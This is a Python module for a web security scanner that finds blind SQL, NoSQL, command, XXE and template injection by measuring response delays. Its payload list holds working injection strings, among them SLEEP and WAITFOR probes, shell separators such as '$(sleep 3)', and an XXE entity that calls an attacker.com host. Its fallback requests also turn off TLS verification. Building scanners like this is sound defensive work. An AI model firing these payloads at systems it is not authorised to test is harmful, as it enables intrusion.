"""
Response Timing Analysis for Blind Injection Detection
Statistical analysis of response times to detect timing-based vulnerabilities

All requests routed through ZAP for unified logging and alerting.
"""
import json
import statistics
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, TYPE_CHECKING
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

if TYPE_CHECKING:
    from modules.zap_http_client import ZAPHttpClient


@dataclass
class TimingResult:
    url: str
    parameter: str
    payload: str
    vulnerable: bool
    confidence: float
    evidence: Dict
    severity: str = "High"
    cwe: str = "CWE-208"
    cvss: float = 7.5


@dataclass
class TimingStats:
    """Statistical analysis of response times"""
    samples: List[float] = field(default_factory=list)
    mean: float = 0.0
    std_dev: float = 0.0
    median: float = 0.0
    min_time: float = 0.0
    max_time: float = 0.0

    def calculate(self):
        if len(self.samples) < 2:
            return
        self.mean = statistics.mean(self.samples)
        self.std_dev = statistics.stdev(self.samples)
        self.median = statistics.median(self.samples)
        self.min_time = min(self.samples)
        self.max_time = max(self.samples)


class TimingAnalyzer:
    """
    Detect blind injection via response timing analysis
    Uses statistical methods to identify timing anomalies
    """

    # Time-based injection payloads
    TIMING_PAYLOADS = {
        'sql_mysql': [
            "' AND SLEEP(3)--",
            "' OR SLEEP(3)--",
            "1' AND SLEEP(3)#",
            "1 AND SLEEP(3)",
            "'; SELECT SLEEP(3);--",
            "' AND (SELECT SLEEP(3))--",
            "' WAITFOR DELAY '0:0:3'--",
        ],
        'sql_postgres': [
            "'; SELECT pg_sleep(3);--",
            "' OR pg_sleep(3)--",
            "1; SELECT pg_sleep(3)--",
            "' AND pg_sleep(3)--",
        ],
        'sql_mssql': [
            "'; WAITFOR DELAY '0:0:3';--",
            "' OR WAITFOR DELAY '0:0:3'--",
            "1; WAITFOR DELAY '0:0:3'",
        ],
        'sql_oracle': [
            "' AND DBMS_PIPE.RECEIVE_MESSAGE('x',3)='x'--",
            "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
        ],
        'nosql': [
            '{"$where":"sleep(3000)"}',
            '{"$where":"function(){sleep(3000)}"}',
        ],
        'command_unix': [
            "; sleep 3",
            "| sleep 3",
            "& sleep 3",
            "`sleep 3`",
            "$(sleep 3)",
            "|| sleep 3",
            "&& sleep 3",
        ],
        'command_windows': [
            "& ping -n 4 127.0.0.1",
            "| ping -n 4 127.0.0.1",
            "; ping -n 4 127.0.0.1",
        ],
        'xxe': [
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/sleep3">]>',
        ],
        'ssti': [
            "{{7*7}}",
            "${7*7}",
            "{{config}}",
        ]
    }

    # Thresholds for detection
    BASELINE_SAMPLES = 5  # Number of baseline requests
    TEST_SAMPLES = 3  # Number of test requests per payload
    TIME_THRESHOLD_SECONDS = 2.5  # Minimum delay to consider vulnerable
    CONFIDENCE_THRESHOLD = 0.6  # Minimum confidence score

    def __init__(self, har_data: Dict, config: Dict = None,
                 zap_client: 'ZAPHttpClient' = None):
        self.har_data = har_data
        self.config = config or {}
        self.timeout = self.config.get('timing_timeout', 30)
        self.delay_target = self.config.get('timing_delay', 3)
        self.max_params = self.config.get('timing_max_params', 10)
        self.zap_client = zap_client
        self._use_zap = zap_client is not None

    def _get(self, url: str, headers: Dict = None) -> Optional[Dict]:
        """HTTP GET via ZAP or fallback"""
        try:
            if self._use_zap:
                resp = self.zap_client.get(url, headers=headers, timeout=self.timeout)
                return {'status_code': resp.status_code, 'content': resp.content,
                        'headers': resp.headers, 'text': resp.text}
            else:
                import requests
                resp = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
                return {'status_code': resp.status_code, 'content': resp.content,
                        'headers': dict(resp.headers), 'text': resp.text}
        except Exception:
            return None

    def _post(self, url: str, headers: Dict = None, data=None, json_data=None) -> Optional[Dict]:
        """HTTP POST via ZAP or fallback"""
        try:
            if self._use_zap:
                post_data = json_data if json_data else data
                resp = self.zap_client.post(url, headers=headers, data=post_data, timeout=self.timeout)
                return {'status_code': resp.status_code, 'content': resp.content,
                        'headers': resp.headers, 'text': resp.text}
            else:
                import requests
                if json_data:
                    resp = requests.post(url, headers=headers, json=json_data,
                                        timeout=self.timeout, verify=False)
                else:
                    resp = requests.post(url, headers=headers, data=data,
                                        timeout=self.timeout, verify=False)
                return {'status_code': resp.status_code, 'content': resp.content,
                        'headers': dict(resp.headers), 'text': resp.text}
        except Exception:
            return None

    def _raise_alert(self, result: 'TimingResult'):
        """Raise ZAP alert for finding"""
        if not self._use_zap:
            return
        risk_map = {'Critical': 3, 'High': 3, 'Medium': 2, 'Low': 1, 'Info': 0}
        self.zap_client.raise_alert(
            risk=risk_map.get(result.severity, 2),
            confidence=2,
            name=f"Timing-Based Injection ({result.evidence.get('category', 'unknown')})",
            description=f"Blind injection detected via timing analysis on parameter '{result.parameter}'",
            uri=result.url,
            param=result.parameter,
            attack=result.payload,
            evidence=f"Time diff: {result.evidence.get('time_difference')}s",
            cwe_id=int(result.cwe.replace('CWE-', '')),
            wasc_id=19
        )

    def identify_injection_points(self) -> List[Dict]:
        """Find parameters that might be vulnerable to injection"""
        injection_points = []
        entries = self.har_data.get('log', {}).get('entries', [])
        seen_params = set()

        for entry in entries:
            request = entry.get('request', {})
            method = request.get('method', 'GET')
            url = request.get('url', '')
            headers = {h['name']: h['value'] for h in request.get('headers', [])}

            parsed = urlparse(url)

            # Query parameters
            if parsed.query:
                params = parse_qs(parsed.query)
                for param_name, values in params.items():
                    param_key = f"{parsed.path}:{param_name}"
                    if param_key not in seen_params:
                        seen_params.add(param_key)
                        injection_points.append({
                            'url': url,
                            'base_url': f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                            'method': method,
                            'param_name': param_name,
                            'param_value': values[0] if values else '',
                            'location': 'query',
                            'headers': headers
                        })

            # Body parameters (JSON)
            body = request.get('postData', {}).get('text', '')
            if body:
                try:
                    body_data = json.loads(body)
                    for key, value in body_data.items():
                        param_key = f"{parsed.path}:body:{key}"
                        if param_key not in seen_params:
                            seen_params.add(param_key)
                            injection_points.append({
                                'url': url,
                                'base_url': url,
                                'method': method,
                                'param_name': key,
                                'param_value': str(value),
                                'location': 'body_json',
                                'headers': headers,
                                'original_body': body_data
                            })
                except json.JSONDecodeError:
                    # Form data
                    for pair in body.split('&'):
                        if '=' in pair:
                            key, value = pair.split('=', 1)
                            param_key = f"{parsed.path}:body:{key}"
                            if param_key not in seen_params:
                                seen_params.add(param_key)
                                injection_points.append({
                                    'url': url,
                                    'base_url': url,
                                    'method': method,
                                    'param_name': key,
                                    'param_value': value,
                                    'location': 'body_form',
                                    'headers': headers,
                                    'original_body': body
                                })

        return injection_points[:self.max_params]

    def measure_baseline(self, injection_point: Dict) -> TimingStats:
        """Measure baseline response time statistics"""
        stats = TimingStats()
        url = injection_point['url']
        method = injection_point['method']
        headers = injection_point.get('headers', {})

        for _ in range(self.BASELINE_SAMPLES):
            start = time.time()
            resp = None
            if method == 'GET':
                resp = self._get(url, headers=headers)
            else:
                body = injection_point.get('original_body')
                if isinstance(body, dict):
                    resp = self._post(url, headers=headers, json_data=body)
                else:
                    resp = self._post(url, headers=headers, data=body)
            elapsed = time.time() - start
            if resp is not None:
                stats.samples.append(elapsed)
            elif elapsed >= self.timeout:
                stats.samples.append(self.timeout)

        stats.calculate()
        return stats

    def _inject_payload(self, injection_point: Dict, payload: str) -> str:
        """Build request URL/body with injected payload"""
        if injection_point['location'] == 'query':
            parsed = urlparse(injection_point['url'])
            params = parse_qs(parsed.query)
            params[injection_point['param_name']] = [payload]
            new_query = urlencode(params, doseq=True)
            return urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))
        return injection_point['url']

    def _inject_body(self, injection_point: Dict, payload: str) -> Optional[Dict]:
        """Build request body with injected payload"""
        if injection_point['location'] == 'body_json':
            body = injection_point.get('original_body', {}).copy()
            body[injection_point['param_name']] = payload
            return body
        elif injection_point['location'] == 'body_form':
            original = injection_point.get('original_body', '')
            parts = []
            for pair in original.split('&'):
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    if key == injection_point['param_name']:
                        parts.append(f"{key}={payload}")
                    else:
                        parts.append(pair)
            return '&'.join(parts)
        return None

    def measure_payload(self, injection_point: Dict, payload: str) -> TimingStats:
        """Measure response time with injected payload"""
        stats = TimingStats()
        method = injection_point['method']
        headers = injection_point.get('headers', {})

        for _ in range(self.TEST_SAMPLES):
            start = time.time()
            resp = None

            if injection_point['location'] == 'query':
                url = self._inject_payload(injection_point, payload)
                if method == 'GET':
                    resp = self._get(url, headers=headers)
                else:
                    resp = self._post(url, headers=headers)
            else:
                url = injection_point['url']
                body = self._inject_body(injection_point, payload)
                if isinstance(body, dict):
                    resp = self._post(url, headers=headers, json_data=body)
                else:
                    resp = self._post(url, headers=headers, data=body)

            elapsed = time.time() - start
            if resp is not None:
                stats.samples.append(elapsed)
            elif elapsed >= self.timeout:
                stats.samples.append(self.timeout)

        stats.calculate()
        return stats

    def analyze_timing_difference(self, baseline: TimingStats,
                                   payload_stats: TimingStats) -> Tuple[bool, float]:
        """
        Analyze timing difference to determine vulnerability
        Returns (is_vulnerable, confidence)
        """
        if not baseline.samples or not payload_stats.samples:
            return False, 0.0

        time_diff = payload_stats.mean - baseline.mean

        # Must exceed time threshold
        if time_diff < self.TIME_THRESHOLD_SECONDS:
            return False, 0.0

        # Calculate confidence based on multiple factors
        confidence = 0.0

        # Factor 1: Time difference vs expected delay
        delay_ratio = min(time_diff / self.delay_target, 1.5)
        if delay_ratio >= 0.8:
            confidence += 0.4
        elif delay_ratio >= 0.5:
            confidence += 0.2

        # Factor 2: Consistency (low std dev in payload samples)
        if payload_stats.std_dev < 0.5:
            confidence += 0.2
        elif payload_stats.std_dev < 1.0:
            confidence += 0.1

        # Factor 3: All payload samples > baseline mean
        if all(s > baseline.mean + self.TIME_THRESHOLD_SECONDS
               for s in payload_stats.samples):
            confidence += 0.3

        # Factor 4: Minimum sample meets threshold
        if payload_stats.min_time > baseline.mean + self.TIME_THRESHOLD_SECONDS:
            confidence += 0.1

        return confidence >= self.CONFIDENCE_THRESHOLD, min(confidence, 1.0)

    def test_injection_point(self, injection_point: Dict) -> List[TimingResult]:
        """Test a single injection point with all payloads"""
        results = []

        print(f"[Timing] Testing: {injection_point['param_name']} ({injection_point['location']})")

        # Measure baseline
        baseline = self.measure_baseline(injection_point)
        if not baseline.samples:
            return results

        print(f"[Timing] Baseline: mean={baseline.mean:.2f}s, std={baseline.std_dev:.2f}s")

        # Test each payload category
        for category, payloads in self.TIMING_PAYLOADS.items():
            for payload in payloads[:2]:  # Limit payloads per category
                payload_stats = self.measure_payload(injection_point, payload)

                if not payload_stats.samples:
                    continue

                is_vulnerable, confidence = self.analyze_timing_difference(baseline, payload_stats)

                if is_vulnerable:
                    result = TimingResult(
                        url=injection_point['url'],
                        parameter=injection_point['param_name'],
                        payload=payload,
                        vulnerable=True,
                        confidence=confidence,
                        evidence={
                            'category': category,
                            'baseline_mean': round(baseline.mean, 3),
                            'baseline_std': round(baseline.std_dev, 3),
                            'payload_mean': round(payload_stats.mean, 3),
                            'payload_std': round(payload_stats.std_dev, 3),
                            'time_difference': round(payload_stats.mean - baseline.mean, 3),
                            'samples': payload_stats.samples
                        }
                    )
                    results.append(result)
                    self._raise_alert(result)
                    print(f"[Timing] 🚨 {category} detected! "
                          f"(diff={payload_stats.mean - baseline.mean:.2f}s, "
                          f"conf={confidence:.2f})")
                    break  # Found vulnerability in this category

        return results

    def run_tests(self, parallel: bool = False) -> List[TimingResult]:
        """Execute timing analysis tests"""
        print("[Timing] Starting response timing analysis...")

        injection_points = self.identify_injection_points()
        print(f"[Timing] Found {len(injection_points)} injection points")

        results = []

        if parallel and len(injection_points) > 1:
            with ThreadPoolExecutor(max_workers=3) as executor:
                futures = {
                    executor.submit(self.test_injection_point, point): point
                    for point in injection_points
                }
                for future in as_completed(futures):
                    results.extend(future.result())
        else:
            for point in injection_points:
                results.extend(self.test_injection_point(point))

        return results

    def generate_report(self, results: List[TimingResult]) -> Dict:
        """Generate summary report"""
        categories = {}
        for r in results:
            if r.vulnerable:
                cat = r.evidence.get('category', 'unknown')
                categories[cat] = categories.get(cat, 0) + 1

        return {
            'total_parameters_tested': len(self.identify_injection_points()),
            'vulnerable_count': len([r for r in results if r.vulnerable]),
            'by_category': categories,
            'findings': [
                {
                    'url': r.url,
                    'parameter': r.parameter,
                    'payload': r.payload,
                    'confidence': r.confidence,
                    'time_diff': r.evidence.get('time_difference'),
                    'category': r.evidence.get('category'),
                    'cwe': r.cwe
                }
                for r in results if r.vulnerable
            ]
        }
